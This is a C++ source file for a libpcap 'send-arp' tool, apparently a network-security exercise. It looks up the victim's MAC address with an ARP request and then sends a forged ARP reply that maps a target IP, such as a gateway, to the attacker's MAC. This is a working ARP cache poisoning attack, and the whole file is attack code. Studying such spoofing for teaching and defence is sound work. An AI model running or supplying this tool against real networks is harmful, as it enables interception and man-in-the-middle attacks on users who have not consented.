#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <cstring>
#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"

#define BUFSIZE 8192

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

typedef struct Mac_add{
	uint8_t addr[6];
} s_Mac_Add;

// Attacker Mac Address
s_Mac_Add getMacAddress(char* interface) {
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock == -1) {
		perror("socket");
		exit(1);
	}

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

	if (ioctl(sock, SIOCGIFHWADDR, &ifr) == -1) {
		perror("ioctl");
		close(sock);
		exit(1);
	}

	close(sock);

	s_Mac_Add mac;
	memcpy(mac.addr, ifr.ifr_hwaddr.sa_data, Mac::SIZE);
	return mac;
}

// Attacker IP Address
uint32_t getIpAddress(char* interface) {
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock == -1) {
		perror("socket");
		exit(1);
	}

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

	if (ioctl(sock, SIOCGIFADDR, &ifr) == -1) {
		perror("ioctl");
		close(sock);
		exit(1);
	}

	close(sock);

	return ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr;
}


int main(int argc, char* argv[]) {
	if (argc / 2 != 0 && argc < 4) {
		usage();
		return -1;
	}

	s_Mac_Add atkr_mac = getMacAddress(argv[1]);
	uint32_t atkr_ip = getIpAddress(argv[1]);

	for (int i = 1; i <= (argc - 2) / 2; i++) {
		char attacker_mac[18] = "";
		sprintf(attacker_mac, "%02x:%02x:%02x:%02x:%02x:%02x", atkr_mac.addr[0], atkr_mac.addr[1], atkr_mac.addr[2], atkr_mac.addr[3], atkr_mac.addr[4], atkr_mac.addr[5]);

		char errbuf[PCAP_ERRBUF_SIZE];

		pcap_t* handle = pcap_open_live(argv[1], BUFSIZE, 1, 1, errbuf);
		if (handle == nullptr) {
			fprintf(stderr, "couldn't open device %s(%s)\n", argv[1], errbuf);
			return -1;
		}

		EthArpPacket packet;	

		// Send ARP request packet
		packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
		packet.eth_.smac_ = Mac(attacker_mac);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(attacker_mac);
		packet.arp_.sip_ = htonl(Ip(std::string(Ip(htonl(atkr_ip))).c_str()));
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // Unknown MAC address
		packet.arp_.tip_ = htonl(Ip(argv[2 * i])); // Victim's IP address

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			return -1;
		}

		// Capture ARP reply packet
		while (true) {

			printf("Waiting for ARP reply...\n");
			struct pcap_pkthdr* header;
			const u_char* packet_data;

			int res = pcap_next_ex(handle, &header, &packet_data);
			if (res == 0) continue; // Timeout expired
			if (res == -1 || res == -2) {
    			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
    			break;
			}

			printf("ARP reply captured\n");

			EthArpPacket* victim_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet_data));


			if (victim_packet->arp_.sip_ == packet.arp_.tip_ && victim_packet->eth_.type_ == htons(EthHdr::Arp) && victim_packet->arp_.op_ == htons(ArpHdr::Reply)) {
				Mac victim_mac = victim_packet->arp_.smac_;
				printf("Victim's MAC address: %s", std::string(victim_mac).c_str());

				// print ip of victim_packet
				printf("Victim's IP address: %s\n", std::string(Ip(victim_packet->arp_.sip_)).c_str());


				EthArpPacket packet2;

				packet2.eth_.dmac_ = Mac(victim_mac);
				packet2.eth_.smac_ = Mac(attacker_mac);
				packet2.eth_.type_ = htons(EthHdr::Arp);	

				packet2.arp_.hrd_ = htons(ArpHdr::ETHER);
				packet2.arp_.pro_ = htons(EthHdr::Ip4);
				packet2.arp_.hln_ = Mac::SIZE;
				packet2.arp_.pln_ = Ip::SIZE;
				packet2.arp_.op_ = htons(ArpHdr::Reply);
				packet2.arp_.smac_ = Mac(attacker_mac);
				packet2.arp_.sip_ = htonl(Ip(argv[2 * i + 1]));
				packet2.arp_.tmac_ = Mac(victim_mac); // Unknown MAC address
				packet2.arp_.tip_ = htonl(Ip(argv[2 * i])); // Victim's IP address

				int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet2), sizeof(EthArpPacket));
				if (res2 != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
					return -1;
				}

				break;
			}
			printf("Not an ARP reply packet\n");
		}

		pcap_close(handle);
	}
}
